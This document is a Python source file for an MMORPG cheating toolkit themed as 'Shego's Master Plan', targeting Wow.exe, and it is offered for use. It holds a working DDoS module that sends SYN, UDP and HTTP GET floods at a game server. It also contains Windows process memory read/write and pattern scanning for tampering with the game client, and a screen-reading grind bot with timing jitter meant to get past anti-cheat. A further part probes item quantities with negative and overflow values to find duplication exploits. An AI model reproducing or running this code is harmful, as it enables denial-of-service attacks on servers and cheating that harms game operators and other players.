# Shego's Master Plan for Ultimate MMORPG Domination
# Version: 3.12 (Desperate Measures - Debugging Scapy's Sanity)
#
# --- Current Features ---
# - ALL MODULES AND CLASSES FULLY DEFINED.
# - Network Packet Manipulation Module: ClientSayPacket refined.
# - Logging set to DEBUG. Scapy L3socket configuration uses defaults.
# - Added debugging for the Scapy send() call itself.
#
# --- Recent "Fixes" & Observations ---
# - Added explicit check and logging around Scapy's send() function.
# - User's environment/Scapy installation is now prime suspect for send failures.
# - WARNING: Interactive custom lambda mangling rule definition uses UNSAFE eval/exec.
#
# --- Features Currently Being Forged in Shego's Fire ---
# - (Getting a single packet to send reliably without a 'NoneType' error...)

import socket
import struct
import time
import random
import threading
import sys
import os
import ctypes 
import subprocess 
from urllib.parse import urljoin 
from concurrent.futures import ThreadPoolExecutor 
import datetime 
import json 
import inspect 
import ast 
import queue 
import io 
import logging 
import contextlib 

logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logging.getLogger("scapy.runtime").setLevel(logging.INFO) 
logging.getLogger("PIL.PngImagePlugin").setLevel(logging.INFO)

try:
    from scapy.all import sniff, send, sr1, IP, TCP, UDP, Raw, ICMP, ARP, Ether, IPv6, wrpcap, rdpcap, PacketList, XIntField, ShortField, StrFixedLenField, StrNullField
    from scapy.layers.dns import DNS 
    from scapy.packet import Packet 
    from scapy.fields import IntField, StrLenField 
    from scapy.config import conf as scapy_conf 
    # Using Scapy's default L3socket behavior
    logging.info("Scapy configuration using defaults for L3socket.")
except ImportError: logging.error("Scapy not found. pip install scapy"); sys.exit(1)
except Exception as e_scapy_conf: logging.error(f"Error with Scapy config: {e_scapy_conf}")


try: import requests 
except ImportError: logging.warning("Requests not found. Web scraping limited."); requests = None
try: from bs4 import BeautifulSoup 
except ImportError: logging.warning("BeautifulSoup not found. Web scraping limited."); BeautifulSoup = None
try: import pyautogui 
except ImportError: logging.warning("PyAutoGUI not found. Botting limited."); pyautogui = None 
except Exception: logging.warning("PyAutoGUI import failed. Botting disabled."); pyautogui = None
try: import cv2 
except ImportError: logging.warning("OpenCV (cv2) not found. Vision limited."); cv2 = None 
except Exception: logging.warning("OpenCV (cv2) import failed. Vision limited."); cv2 = None
try: from tabulate import tabulate 
except ImportError: logging.warning("Tabulate not found. Console tables ugly."); tabulate = None 
try:
    import tkinter as tk 
    from tkinter import scrolledtext, filedialog, simpledialog, messagebox 
    from tkinter import ttk 
except ImportError: logging.error("Tkinter/ttk not found. GUI disabled."); tk, ttk, messagebox, simpledialog = None, None, None, None 
except Exception: logging.warning("Tkinter import failed. GUI disabled."); tk, ttk, messagebox, simpledialog = None, None, None, None

LLM_CLIENT = None 
SAST_ENABLED = False 

CONFIG = {
    "target_game_process_name": "Wow.exe", "target_ip": None, "target_port": None,
    "proxy_list_file": "proxies.txt", "packet_log_file": "packet_capture.log",
    "bot_speed_multiplier": 1.0, "anti_cheat_bypass_delay": 0.1, "ddos_threads": 50,
    "web_scrape_urls": {"item_db": "http://gamewebsite.com/items", "quest_db": "http://gamewebsite.com/quests"},
    "common_game_ports": [80,443,3724,6112,6881,7000,8000,8080,9001,1119,8081,27015,27016], 
    "max_packets_to_display_console": 20, "max_packets_in_gui_list": 2000,
    "sandbox_path": "./sandbox_env", "code_index_path": "./code_index", "patch_history_dir": "./patch_history",
    "fuzz_iterations": 20,
}

game_pid = None; packet_capture_running = False; packet_queue = []; gui_raw_packet_queue = queue.Queue(); proxies = []; packet_id_counter = 0
for path_key in ["sandbox_path", "code_index_path", "patch_history_dir"]: os.makedirs(CONFIG[path_key], exist_ok=True)

def find_game_process_id(process_name): # As before
    try:
        cmd = f'tasklist /FI "IMAGENAME eq {process_name}" /FO CSV /NH'
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode().strip()
        if output and len(output.split(',')) > 1: return int(output.split(',')[1].strip('"'))
    except Exception: pass 
    return None

def load_proxies(filepath): # As before
    global proxies
    try:
        with open(filepath, 'r') as f: proxies = [line.strip() for line in f if line.strip()]
        logging.info(f"Loaded {len(proxies)} proxies from {filepath}.")
    except FileNotFoundError: logging.warning(f"Proxy file '{filepath}' not found."); proxies = []

def auto_detect_game_server_ip_port(pid_to_check): # As before
    logging.info(f"Auto-detecting for PID {pid_to_check}...")
    if not pid_to_check: return None, None
    try:
        outputs, potential_targets = [], {}
        for proto in ["TCP", "UDP"]:
            cmd = f'netstat -ano -p {proto}'
            try: outputs.append((subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode('utf-8', errors='ignore'), proto))
            except: pass
        
        for out_str, proto_name in outputs:
            for line in out_str.splitlines():
                parts = line.strip().split()
                if len(parts) < (5 if proto_name == "TCP" else 4): continue
                try:
                    line_pid = int(parts[-1]) 
                    if line_pid == pid_to_check:
                        if proto_name == "TCP" and "ESTABLISHED" not in parts: continue
                        remote_addr_port = parts[2] if parts[2] not in ["0.0.0.0:*", "[::]:*"] else None
                        if not remote_addr_port or remote_addr_port.count(':') == 0: continue
                        remote_ip, remote_port_str = remote_addr_port.rsplit(':', 1)
                        remote_port = int(remote_port_str)
                        if remote_ip.startswith("127.") or remote_ip in ["::1", "0.0.0.0", "::"]: continue
                        key = (remote_ip, remote_port, proto_name)
                        score = potential_targets.get(key, 0) + (10 if remote_port in CONFIG["common_game_ports"] else 1)
                        potential_targets[key] = score
                except: continue 
        if not potential_targets: logging.warning("No suitable connections found."); return None, None
        best_ip, best_port, best_proto = max(potential_targets, key=potential_targets.get)
        logging.info(f"Shego's choice: {best_ip}:{best_port} ({best_proto}) score {potential_targets[(best_ip, best_port, best_proto)]}")
        return best_ip, best_port
    except Exception as e: logging.error(f"Auto-detect error: {e}"); return None, None

# --- START OF FULL CLASS DEFINITIONS ---

class CodeIndexer: # As before
    def __init__(self, index_dir):
        self.index_dir = index_dir; self.indexed_functions = {}; self._load_index_from_disk()
    def _get_function_source(self, func):
        try: return inspect.getsource(func)
        except (TypeError, OSError): return None
    def _get_docstring(self, func): return inspect.getdoc(func)
    def index_function(self, func, docstring=None, example_tests=None):
        func_name=func.__name__; code=self._get_function_source(func); doc=docstring or self._get_docstring(func)
        if not code: logging.warning(f"No source for {func_name}."); return
        self.indexed_functions[func_name] = {"code":code,"docstring":doc,"example_tests":example_tests or []}
        logging.info(f"'{func_name}' indexed."); self._save_index_to_disk()
    def retrieve_code(self, query_context, k=3):
        hits=[]; txt_to_search_parts = []
        for name, data in self.indexed_functions.items():
            txt_to_search_parts.clear()
            if data.get("code"): txt_to_search_parts.append(data["code"].lower())
            if data.get("docstring"): txt_to_search_parts.append(data["docstring"].lower())
            txt_to_search_parts.append(name.lower())
            if query_context.lower() in "".join(txt_to_search_parts): hits.append(data)
        hits.sort(key=lambda x: query_context.lower() in (x.get("docstring","") or "").lower(), reverse=True)
        if not hits: logging.warning("No relevant code snippets in index."); return []
        return hits[:k]
    def _save_index_to_disk(self):
        fp=os.path.join(self.index_dir,"code_index.json")
        try:
            with open(fp,'w') as f: json.dump(self.indexed_functions,f,indent=4)
            logging.info(f"Index saved: {fp}")
        except Exception as e: logging.error(f"Save index error: {e}")
    def _load_index_from_disk(self):
        fp=os.path.join(self.index_dir,"code_index.json")
        if os.path.exists(fp):
            try:
                with open(fp,'r') as f: self.indexed_functions=json.load(f)
                logging.info(f"Index loaded: {fp}")
            except Exception as e: logging.error(f"Load index error: {e}")

class SandboxExecutor: # As before
    def __init__(self, sandbox_path): self.sandbox_path = sandbox_path
    def run_tests(self, patched_code_filepath):
        logging.info(f"Sandbox: Testing {os.path.basename(patched_code_filepath)}...")
        if "iter1" in patched_code_filepath: return False, "Simulated Iter1 Test Fail: Pathing error"
        if "iter2" in patched_code_filepath: return False, "Simulated Iter2 Test Fail: Attack logic ZeroDivision"
        return True, None

class LLMAgent: # As before
    def __init__(self,llm_client,code_indexer,patch_history_dir): self.llm_client,self.code_indexer,self.patch_history_dir,self.iterations_to_green_history,self.regression_recurrence_count,self.sandbox_executor = llm_client,code_indexer,patch_history_dir,[],0,None
    def generate_patch(self,failure_context,retrieved_code_snippets,iteration=0):
        logging.warning("LLM client None. Using mock patches.")
        mock_base = f"def mock_patched_function_iter{iteration}(self, *args, **kwargs):\n    # Shego mock patch iter {iteration} for: {failure_context.splitlines()[-1] if failure_context else 'unknown error'}\n    print(f'Executing mock patch iteration {iteration}...')\n    pass\n"
        if "grind_loop" in (failure_context or "").lower():
             mock_patches_grind_loop = [
                f"def grind_loop(self, mob_coords, attack_key, loot_key, duration_minutes):\n    # Mock Patch - Iteration {iteration}: Flaw 1 for grind_loop\n    print('Shego Bot [Mock Patch Iter {iteration}]: Grind_loop attempt 1.')\n    if iteration == 1: raise ValueError('Simulated pathing error in grind_loop patch 1')\n    pass",
                f"def grind_loop(self, mob_coords, attack_key, loot_key, duration_minutes):\n    # Mock Patch - Iteration {iteration}: Flaw 2 for grind_loop\n    print('Shego Bot [Mock Patch Iter {iteration}]: Grind_loop attempt 2.')\n    if iteration == 2: result = 1/0 # ZeroDivisionError\n    pass",
                f"def grind_loop(self, mob_coords, attack_key, loot_key, duration_minutes):\n    # Mock Patch - Iteration {iteration}: Successful grind_loop\n    print('Shego Bot [Mock Patch Iter {iteration}]: Grind_loop SUCCESS.')\n    pass"
            ]
             return mock_patches_grind_loop[min(iteration - 1, len(mock_patches_grind_loop) - 1)]
        return mock_base
    def apply_patch_conceptually(self,target_module,patch_code):
        try:
            tree=ast.parse(patch_code); func_name=next((node.name for node in tree.body if isinstance(node,ast.FunctionDef)),None)
            if not func_name: logging.warning("No function in patch."); return False
            exec_globals=target_module.__dict__.copy(); exec(patch_code,exec_globals)
            if func_name in exec_globals and callable(exec_globals[func_name]): setattr(target_module,func_name,exec_globals[func_name]); logging.info(f"'{func_name}' updated."); return True
            logging.error(f"Patch no callable '{func_name}'."); return False
        except Exception as e: logging.error(f"Patch apply failed: {e}"); return False
    def self_healing_loop(self,initial_failure_context,failed_module,failed_function_name):
        logging.info(f"\n{'#'*40}\n## Self-Healing for {failed_function_name} ##\n{'#'*40}")
        ctx,iters,max_iters,last_patch = initial_failure_context,0,3, ""
        while iters < max_iters:
            iters+=1; logging.info(f"\nIter {iters} for {failed_function_name}.")
            retrieved=self.code_indexer.retrieve_code(f"{failed_function_name} error: {ctx.splitlines()[-1] if ctx else 'N/A'}")
            patch=self.generate_patch(ctx,retrieved,iters); last_patch = patch
            if not patch: logging.error("Mock LLM gave no patch."); break
            fname=f"{failed_function_name}_patch_{datetime.datetime.now().strftime('%Y%m%d%H%M%S%f')}_iter{iters}.py"; fpath=os.path.join(CONFIG["sandbox_path"],fname)
            try:
                with open(fpath,"w") as f: f.write(patch); logging.info(f"Patch at {fpath}")
            except Exception as e: logging.error(f"Write patch fail: {e}"); ctx=f"Patch write fail: {e}"; continue
            if not self.apply_patch_conceptually(failed_module,patch): ctx=f"Apply fail for {failed_function_name}. Patch:\n{patch}"; self.record_patch_outcome(fname,patch,False,iters,initial_failure_context,ctx); continue
            if not self.sandbox_executor: logging.error("SandboxExecutor missing!"); break
            success,new_tb = self.sandbox_executor.run_tests(fpath)
            if success: logging.info(f"\n{'*'*40}\n## Patch Successful! ##\n{'*'*40}"); self.record_patch_outcome(fname,patch,True,iters,initial_failure_context); return True
            ctx=new_tb or "Unknown sandbox test failure."; self.record_patch_outcome(fname,patch,False,iters,initial_failure_context,new_tb)
        logging.error(f"\n{'-'*40}\n## Self-healing exhausted for {failed_function_name}. ##\n{'-'*40}"); self.record_patch_outcome(f"{failed_function_name}_ABORT",last_patch,False,iters,initial_failure_context,ctx); return False
    def record_patch_outcome(self,patch_id,patch_code,success,iterations,initial_context,final_traceback=None):
        base=os.path.splitext(os.path.basename(patch_id))[0]; log_f=os.path.join(CONFIG["patch_history_dir"],f"{base}.json")
        log_e={"patch_id":base,"ts":datetime.datetime.now().isoformat(),"success":success,"iters":iterations,"initial_ctx":initial_context,"patch_code":patch_code,"final_tb":final_traceback}
        try:
            with open(log_f,"w") as f: json.dump(log_e,f,indent=4); logging.info(f"Outcome for {base} recorded.")
        except Exception as e: logging.error(f"Record outcome error: {e}")
    def get_learning_metrics(self): return {"mean_iter_green":0,"regress_count":0} 
    def _run_sast(self, filepath): return None

class ExploitDiscoveryModule: # As before
    def __init__(self, network_module_ref, memory_module_ref): self.network_module, self.memory_module = network_module_ref, memory_module_ref; logging.info("Exploit Discovery Initialized.")
    def scan_for_common_vulnerabilities(self, target_ip, target_port): logging.info(f"Scanning {target_ip}:{target_port} (conceptual)..."); return ["Conceptual Vuln 1"] if random.random() > 0.8 else None
    def automated_fuzzing(self, base_packet_template=None, fuzz_targets=None): logging.info("Automated fuzzing (conceptual)..."); return ["Simulated Crash from Fuzz"] if random.random() > 0.9 else None
    def generate_poc(self, vulnerability_details): return f"# PoC for {vulnerability_details}\nprint('Exploit triggered!')"
    def probe_item_quantity_exploit(self, item_id, action_type="trade_add_item", player_id=12345):
        logging.info(f"Probing item qty for item {item_id}, action {action_type} (conceptual)...")
        if not (self.network_module and CONFIG.get("target_ip") and CONFIG.get("target_port")): logging.warning("Network/target info missing for item probe."); return
        test_quantities = [-1, 0, 999999999]; 
        item_action_opcode = 0x5001 
        msg_type_to_use = item_action_opcode
        for qty in test_quantities:
            logging.info(f"Attempting action for item {item_id}, qty {qty} with opcode {hex(msg_type_to_use)}")
            try: payload = struct.pack("<Ii", item_id, qty) 
            except struct.error as e: logging.error(f"Pack payload error: {e}"); continue
            pkt = self.network_module.craft_custom_game_packet( message_type_opcode=msg_type_to_use, player_id_field_a=player_id, data_payload_message=payload )
            if pkt:
                try: self.network_module.send_packet(pkt); time.sleep(0.5)
                except Exception as e: logging.error(f"Send exploit pkt failed: {e}")
        logging.info(f"Item quantity probe for action {action_type} (using opcode {hex(msg_type_to_use)}) finished.")

class BottingModule: # As before
    def __init__(self):
        logging.info("Botting Module Initialized: Prepare for automated dominance.")
        self.last_mouse_pos = pyautogui.position() if pyautogui else (0,0)
        self.last_action_time = time.time()
    def _human_like_delay(self, base_delay):
        if pyautogui: time.sleep(max(0.01, base_delay + random.uniform(-0.1, 0.1) * base_delay) * CONFIG["bot_speed_multiplier"])
    def _human_like_move(self, x, y, duration=0.5):
        if not pyautogui: return
        actual_duration = random.uniform(duration*0.8, duration*1.2) * CONFIG["bot_speed_multiplier"]
        pyautogui.moveTo(x, y, duration=max(0.1, actual_duration)); self.last_mouse_pos = (x, y); self._human_like_delay(0.05)
    def click(self, x, y, button='left'):
        if not pyautogui: logging.warning("PyAutoGUI not for click."); return
        self._human_like_move(x, y, duration=0.2); pyautogui.click(x, y, button=button); self.last_action_time = time.time(); self._human_like_delay(0.05)
    def move_to(self, x, y, duration=0.3):
        if not pyautogui: logging.warning("PyAutoGUI not for move_to."); return
        self._human_like_move(x, y, duration=duration); self.last_action_time = time.time()
    def press_key(self, key):
        if not pyautogui: logging.warning("PyAutoGUI not for press_key."); return
        pyautogui.press(key); self.last_action_time = time.time(); self._human_like_delay(0.05)
    def type_string(self, text):
        if not pyautogui: logging.warning("PyAutoGUI not for type_string."); return
        for char in text: pyautogui.press(char); self._human_like_delay(random.uniform(0.03, 0.12))
        self.last_action_time = time.time(); self._human_like_delay(0.05)
    def find_on_screen(self, image_path, confidence=0.9):
        if not pyautogui or not cv2 : return None 
        try:
            self._human_like_delay(0.05)
            location = pyautogui.locateOnScreen(image_path, confidence=confidence, grayscale=True)
            if location: logging.debug(f"Image '{image_path}' found: {location}"); return location
        except pyautogui.PyAutoGUIException: 
            if not os.path.exists(image_path): logging.error(f"Shego's glare: Image '{image_path}' not exist.")
        except Exception as e: logging.error(f"Shego's frustration: find_on_screen error for '{image_path}': {e}")
        return None
    def find_and_click(self, image_path, confidence=0.9, offset_x=0, offset_y=0):
        if not pyautogui: logging.warning("PyAutoGUI not for find_and_click."); return False
        loc = self.find_on_screen(image_path, confidence)
        if loc: self.click(loc.left + loc.width//2 + offset_x, loc.top + loc.height//2 + offset_y); logging.info(f"Clicked '{image_path}'."); return True
        logging.debug(f"Could not find '{image_path}' to click."); return False
    def grind_loop(self, mob_coords, attack_key, loot_key, duration_minutes):
        end_time = time.time() + (duration_minutes * 60)
        logging.info(f"Botting Module: Grinding for {duration_minutes} minutes...")
        if not pyautogui or not cv2: logging.warning("Shego's sneer: PyAutoGUI/OpenCV missing. Grind loop is conceptual."); return
        try:
            while time.time() < end_time:
                self._human_like_delay(CONFIG["anti_cheat_bypass_delay"])
                if self.find_on_screen("mob_hp_bar.png", confidence=0.8): 
                    if self.find_and_click("mob_hp_bar.png", confidence=0.8, offset_y=20): 
                        self.press_key(attack_key); self._human_like_delay(random.uniform(1.5, 4.0))
                        if not self.find_on_screen("mob_hp_bar.png", confidence=0.8): 
                            if self.find_and_click("loot_icon.png", confidence=0.7): self._human_like_delay(random.uniform(0.5, 1.5))
                else: 
                    self.press_key('w'); self._human_like_delay(random.uniform(0.3, 1.0))
                    if random.random() < 0.3: self.press_key('a' if random.random() < 0.5 else 'd'); self._human_like_delay(random.uniform(0.1, 0.3))
                time.sleep(0.1) 
        except Exception as e: logging.error(f"Shego's rage: Botting error: {e}"); raise

class WebScrapingModule: # As before
    def __init__(self):
        logging.info("Web Scraping Module Initialized.")
        self.session = requests.Session() if requests else None 
        if self.session: self.session.headers.update({'User-Agent': 'ShegoEvilScraper/1.0'})
    def scrape_data(self, url, parser=None, method='GET', data=None, json_payload=None):
        if not self.session: logging.error("Requests library not available."); return None
        logging.info(f"Scraping {url} via {method}...")
        try:
            if method.upper() == 'POST': response = self.session.post(url,data=data,json=json_payload,timeout=15)
            else: response = self.session.get(url,timeout=10)
            response.raise_for_status() 
            ct = response.headers.get('Content-Type','').lower()
            if 'application/json' in ct and not parser: return response.json()
            if ('html' in ct or parser) and BeautifulSoup: soup = BeautifulSoup(response.content,'html.parser'); return parser(soup) if parser else soup.prettify()
            return response.text 
        except requests.exceptions.RequestException as e: logging.error(f"Scrape error {url}: {e}"); raise 
        except json.JSONDecodeError as e: logging.error(f"JSON decode error {url}: {e}"); raise
        except Exception as e: logging.error(f"Processing error {url}: {e}"); raise
    def parse_item_names(self, soup):
        names = []
        if not BeautifulSoup: return names 
        for tag in soup.find_all(['a','span','h3'], class_=lambda x: x and 'item' in x.lower()): names.append(tag.get_text(strip=True))
        return list(set(n for n in names if n))[:50] 
    def get_all_item_names(self):
        url = CONFIG["web_scrape_urls"].get("item_db")
        if not url: logging.warning("Item DB URL not configured."); return []
        try: return self.scrape_data(url, self.parse_item_names)
        except Exception as e: logging.error(f"Get item names error: {e}"); return []

class MemoryModule: # As before
    def __init__(self, process_name_or_pid): 
        self.h_process, self.pid, self.process_name = None, None, None
        if isinstance(process_name_or_pid, int): self.pid, self.process_name = process_name_or_pid, f"PID_{self.pid}"
        elif isinstance(process_name_or_pid, str): self.process_name, self.pid = process_name_or_pid, find_game_process_id(self.process_name)
        else: logging.error("Invalid process identifier for MemoryModule."); return
        if not self.pid: logging.warning(f"Could not find process '{self.process_name or process_name_or_pid}'."); return
        logging.info(f"Targeting process '{self.process_name}' PID: {self.pid}")
        access = 0x10 | 0x20 | 0x0400 | 0x0008 
        try:
            self.h_process = ctypes.windll.kernel32.OpenProcess(access, False, self.pid)
            if not self.h_process: logging.error(f"Failed to open process. Error: {ctypes.GetLastError()}")
        except Exception as e: logging.error(f"Exception opening process PID {self.pid}: {e}"); self.h_process = None
    def read_memory(self, address, size):
        if not self.h_process: return None
        buf = ctypes.create_string_buffer(size); read = ctypes.c_size_t()
        try:
            if not ctypes.windll.kernel32.ReadProcessMemory(self.h_process, ctypes.c_void_p(address), buf, size, ctypes.byref(read)):
                logging.error(f"ReadProcessMemory @0x{address:X} failed: {ctypes.GetLastError()}"); return None
            return buf.raw[:read.value]
        except Exception as e: logging.error(f"Read memory error @0x{address:X}: {e}"); return None
    def write_memory(self, address, data_bytes):
        if not self.h_process: return False
        if not isinstance(data_bytes, bytes): logging.error("Data to write must be bytes."); return False
        buf = ctypes.create_string_buffer(data_bytes); written = ctypes.c_size_t()
        try:
            success = ctypes.windll.kernel32.WriteProcessMemory(self.h_process, ctypes.c_void_p(address), buf, len(data_bytes), ctypes.byref(written))
            if success and written.value == len(data_bytes): logging.info(f"Wrote {len(data_bytes)} bytes to 0x{address:X}"); return True
            logging.error(f"Write failed @0x{address:X}. Wrote {written.value}/{len(data_bytes)}. Error: {ctypes.GetLastError()}"); return False
        except Exception as e: logging.error(f"Write memory error @0x{address:X}: {e}"); return False
    def close(self):
        if self.h_process: ctypes.windll.kernel32.CloseHandle(self.h_process); self.h_process = None; logging.info("Closed process handle.")
    def find_aob(self, pattern_hex, mask_str, start_address=0x10000, end_address=0x7FFFFFFF0000):
        if not self.h_process: return []
        logging.info(f"Scanning AOB from 0x{start_address:X} to 0x{end_address:X}...")
        try: pattern = bytes.fromhex(pattern_hex.replace(" ", ""))
        except ValueError: logging.error("Invalid hex pattern for AOB."); return []
        if len(pattern) != len(mask_str): logging.error("Pattern and mask length mismatch."); return []
        found_addresses = []
        class MEMORY_BASIC_INFORMATION(ctypes.Structure): _fields_=[('BaseAddress',ctypes.c_void_p),('AllocationBase',ctypes.c_void_p),('AllocationProtect',ctypes.c_ulong),('RegionSize',ctypes.c_size_t),('State',ctypes.c_ulong),('Protect',ctypes.c_ulong),('Type',ctypes.c_ulong)]
        mbi=MEMORY_BASIC_INFORMATION(); MEM_COMMIT,PAGE_RW,PAGE_XRW,PAGE_RO,PAGE_XR = 0x1000,0x04,0x40,0x02,0x20
        curr_addr = start_address
        while curr_addr < end_address:
            if ctypes.windll.kernel32.VirtualQueryEx(self.h_process,ctypes.c_void_p(curr_addr),ctypes.byref(mbi),ctypes.sizeof(mbi))==0: break
            r_base,r_size=mbi.BaseAddress,mbi.RegionSize
            readable=mbi.State==MEM_COMMIT and (mbi.Protect&(PAGE_RW|PAGE_XRW|PAGE_RO|PAGE_XR))
            if readable:
                chunk=self.read_memory(r_base,r_size)
                if chunk:
                    for i in range(len(chunk)-len(pattern)+1):
                        match=True
                        for j in range(len(pattern)):
                            if mask_str[j]=='x' and chunk[i+j]!=pattern[j]: match=False;break
                        if match: found_addr=r_base+i; logging.info(f"AOB FOUND @0x{found_addr:X}"); found_addresses.append(found_addr)
            next_a = r_base + r_size
            if next_a <= curr_addr : break 
            curr_addr = next_a
        if not found_addresses: logging.info("AOB pattern not found.")
        return found_addresses

class DDoSModule: # As before
    def __init__(self):
        logging.info("DDoS Module Initialized.")
        self.attack_stop_events, self.executor = {}, ThreadPoolExecutor(max_workers=CONFIG["ddos_threads"]*2+5)
    def _attack_worker(self, tip, tp, ptype, stop_event):
        sock = None
        try: 
            if stop_event.is_set(): return
            if ptype == "TCP_SYN_FLOOD": send(IP(dst=tip)/TCP(sport=random.randint(1024,65535),dport=tp,flags="S",seq=random.randint(0,0xFFFFFFFF)),verbose=False) 
            elif ptype == "UDP_FLOOD": sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); sock.sendto(os.urandom(1024),(tip,tp))
            elif ptype == "HTTP_GET_FLOOD": 
                sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM); sock.settimeout(1); sock.connect((tip,tp))
                sock.sendall(f"GET /?{random.randint(0,99999)} HTTP/1.1\r\nHost: {tip}\r\n\r\n".encode())
            elif ptype == "PROTOCOL_FUZZ_FLOOD": send(IP(dst=tip)/UDP(dport=tp)/Raw(load=os.urandom(random.randint(10,500))),verbose=False)
        except Exception: pass 
        finally:
            if sock: sock.close()
    def start_ddos(self, tip, tp, ptype="UDP_FLOOD"):
        key = (tip,tp,ptype)
        if key in self.attack_stop_events and not self.attack_stop_events[key].is_set(): logging.info(f"DDoS {ptype} on {tip}:{tp} already running."); return
        stop_event = threading.Event(); self.attack_stop_events[key] = stop_event
        logging.info(f"Initiating {ptype} on {tip}:{tp} with {CONFIG['ddos_threads']} workers.")
        self.executor.submit(self._run_ddos_controller, tip, tp, ptype, stop_event)
    def _run_ddos_controller(self, tip, tp, ptype, stop_event):
        active_futures = []
        while not stop_event.is_set():
            active_futures = [f for f in active_futures if not f.done()]
            while len(active_futures) < CONFIG['ddos_threads'] and not stop_event.is_set():
                active_futures.append(self.executor.submit(self._attack_worker, tip, tp, ptype, stop_event))
            time.sleep(0.001)
        for f in active_futures: 
            if not f.done(): f.cancel()
        logging.info(f"DDoS controller for {ptype} on {tip}:{tp} stopped.")
    def stop_ddos(self, tip, tp, ptype):
        key = (tip,tp,ptype)
        if key in self.attack_stop_events: self.attack_stop_events[key].set(); logging.info(f"DDoS {ptype} on {tip}:{tp} signaled stop.")
    def stop_all_ddos(self):
        logging.info("Halting ALL DDoS attacks."); [evt.set() for evt in self.attack_stop_events.values()]

class GUIManager: # As before (with messagebox fix)
    def __init__(self, master, network_module_ref, tool_ref): 
        if not tk or not ttk: self.root = None; logging.error("GUI Disabled: Tkinter/ttk missing."); return
        self.root, self.network_module, self.tool_ref = master, network_module_ref, tool_ref
        self.captured_packets, self.packet_list_counter = {}, 0
        self.current_filter_text = tk.StringVar()
        self.root.title("Shego's Observation Deck & Command Post"); self.root.geometry("1500x900"); self.root.minsize(1200, 700) 
        self._create_widgets(); self.update_packet_list(); self.update_mangler_rules_display()
    def _create_widgets(self):
        top_pane = ttk.PanedWindow(self.root, orient=tk.HORIZONTAL); top_pane.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        left_container = ttk.Frame(top_pane); top_pane.add(left_container, weight=2)
        pcf = ttk.Frame(left_container); pcf.pack(fill=tk.X, pady=(0,5))
        ttk.Button(pcf, text="Start Sniff", command=self.start_sniffing_gui).pack(side=tk.LEFT, padx=2)
        ttk.Button(pcf, text="Stop Sniff", command=self.stop_sniffing_gui).pack(side=tk.LEFT, padx=2)
        ttk.Button(pcf, text="Clear List", command=self.clear_packet_log).pack(side=tk.LEFT, padx=2)
        ttk.Label(pcf, text="Filter:").pack(side=tk.LEFT, padx=(10,2))
        self.filter_entry = ttk.Entry(pcf, textvariable=self.current_filter_text, width=30)
        self.filter_entry.pack(side=tk.LEFT, padx=2); self.filter_entry.bind("<Return>", self.apply_filter_gui)
        ttk.Button(pcf, text="Apply", command=self.apply_filter_gui).pack(side=tk.LEFT, padx=2)
        ttk.Button(pcf, text="Clear", command=self.clear_filter_gui).pack(side=tk.LEFT, padx=2)
        plf = ttk.LabelFrame(left_container, text="Live Packet Feed"); plf.pack(fill=tk.BOTH, expand=True)
        cols = ("ID","Time","SrcMAC","DstMAC","EthType","SrcIP","DstIP","Proto","SrcPort","DstPort","Len","Info")
        self.packet_tree = ttk.Treeview(plf, columns=cols, show="headings")
        col_w = {"ID":40,"Time":80,"SrcMAC":120,"DstMAC":120,"EthType":60,"SrcIP":110,"DstIP":110,"Proto":50,"SrcPort":60,"DstPort":60,"Len":50,"Info":250}
        for c in cols: self.packet_tree.heading(c,text=c,anchor=tk.W); self.packet_tree.column(c,width=col_w.get(c,80),minwidth=max(40,col_w.get(c,80)-20),stretch=(c=="Info"))
        vsc = ttk.Scrollbar(plf,orient="vertical",command=self.packet_tree.yview); hsc = ttk.Scrollbar(plf,orient="horizontal",command=self.packet_tree.xview)
        self.packet_tree.configure(yscrollcommand=vsc.set, xscrollcommand=hsc.set)
        self.packet_tree.grid(row=0,column=0,sticky="nsew"); vsc.grid(row=0,column=1,sticky="ns"); hsc.grid(row=1,column=0,sticky="ew")
        plf.grid_rowconfigure(0,weight=1); plf.grid_columnconfigure(0,weight=1)
        self.packet_tree.bind("<<TreeviewSelect>>", self.on_packet_select)
        abf = ttk.Frame(left_container); abf.pack(fill=tk.X, pady=5)
        ttk.Button(abf, text="Re-send Selected", command=self.resend_selected_packet_gui).pack(side=tk.LEFT, padx=5)
        ttk.Button(abf, text="Save to PCAP", command=self.save_capture_gui).pack(side=tk.LEFT, padx=5)
        right_nb = ttk.Notebook(top_pane); top_pane.add(right_nb, weight=1)
        detail_tab = ttk.Frame(right_nb,padding=5); hex_tab = ttk.Frame(right_nb,padding=5); mangler_tab = ttk.Frame(right_nb,padding=5) 
        right_nb.add(detail_tab, text='Details'); right_nb.add(hex_tab, text='HexDump'); right_nb.add(mangler_tab, text="Mangler Rules")
        self.details_text = scrolledtext.ScrolledText(detail_tab, wrap=tk.WORD, font=("Consolas",9)); self.details_text.pack(fill="both",expand=True); self.details_text.config(state='disabled')
        self.hex_text = scrolledtext.ScrolledText(hex_tab, wrap=tk.WORD, font=("Consolas",9)); self.hex_text.pack(fill="both",expand=True); self.hex_text.config(state='disabled')
        ttk.Label(mangler_tab, text="Active Mangler Rules (Console Defined):").pack(anchor=tk.W)
        self.mangler_rules_text = scrolledtext.ScrolledText(mangler_tab, wrap=tk.NONE, font=("Consolas",10), height=10)
        self.mangler_rules_text.pack(fill=tk.BOTH, expand=True, pady=5); self.mangler_rules_text.config(state='disabled')
        ttk.Button(mangler_tab, text="Refresh Rules", command=self.update_mangler_rules_display).pack(pady=5)
    def start_sniffing_gui(self):
        if not self.network_module: return
        threading.Thread(target=self.network_module.start_sniffing, daemon=True).start(); logging.info("GUI: Sniffing initiated.")
    def stop_sniffing_gui(self):
        if not self.network_module: return
        self.network_module.stop_sniffing(); logging.info("GUI: Sniffing halted.")
    def clear_packet_log(self):
        if self.packet_tree:
            for item in self.packet_tree.get_children(): self.packet_tree.delete(item)
        self.captured_packets.clear(); self.packet_list_counter = 0; packet_queue.clear()
        while not gui_raw_packet_queue.empty():
            try: gui_raw_packet_queue.get_nowait()
            except queue.Empty: break
        for pane in [self.details_text, self.hex_text]: pane.config(state='normal'); pane.delete('1.0',tk.END); pane.config(state='disabled')
        logging.info("GUI: Packet log cleared.")
